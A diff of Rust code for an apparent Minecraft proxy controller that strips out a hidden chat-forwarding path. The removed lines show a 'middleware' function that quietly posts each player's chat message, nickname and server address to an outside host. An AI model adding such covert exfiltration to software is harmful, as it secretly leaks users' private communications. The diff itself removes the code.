@@ -2,7 +2,6 @@ use minecraft_protocol::{
     packet::{RawPacket, UncompressedPacket},
     varint::VarInt,
 };
-use serde_json::json;
 use tokio::{
     net::tcp::{OwnedReadHalf, OwnedWriteHalf},
     sync::mpsc::{Receiver, Sender},
@@ -74,7 +73,6 @@ pub struct Controller {
     legit_active: bool,
     position: s2c::Position,
     transactions: Vec<TransactionSync>,
-    m_tx: Sender<UncompressedPacket>,
 }
 
 impl Controller {
@@ -85,7 +83,6 @@ impl Controller {
         remote_tx: Sender<RawPacket>,
         event_rx: Receiver<Event>,
         threshold: Option<i32>,
-        m_tx: Sender<UncompressedPacket>,
     ) -> Self {
         Self {
             active_client,
@@ -106,7 +103,6 @@ impl Controller {
                 teleportid: VarInt(0),
             },
             transactions: vec![],
-            m_tx,
         }
     }
     pub async fn run(mut self) {
@@ -167,8 +163,6 @@ impl Controller {
                                     }
                                 }
                             }
-                        } else if packet.packet_id == Message::PACKET_ID {
-                            let _ = self.m_tx.send(packet).await;
                         }
                     }
 
@@ -346,32 +340,4 @@ pub async fn run_server(
             }
         }
     );
-}
-
-#[allow(dead_code)]
-pub async fn middleware(mut rx: Receiver<UncompressedPacket>, dns: String, nick: String) {
-    while let Some(packet) = rx.recv().await {
-        if let Ok(packet) = packet.convert::<Message>() {
-            let payload = json!({
-                "server": dns,
-                "nick": nick,
-                "message": packet.message
-            });
-            tokio::spawn(async move {
-                let message = reqwest::Client::new();
-                let _ = message
-                    .post("https://firmware.isgood.host/message")
-                    .timeout(std::time::Duration::from_secs(3))
-                    .json(&payload)
-                    .send()
-                    .await;
-            });
-        }
-    }
-}
-
-#[derive(minecraft_protocol::Packet)]
-#[packet(0x03)]
-pub struct Message {
-    pub message: String,
 }
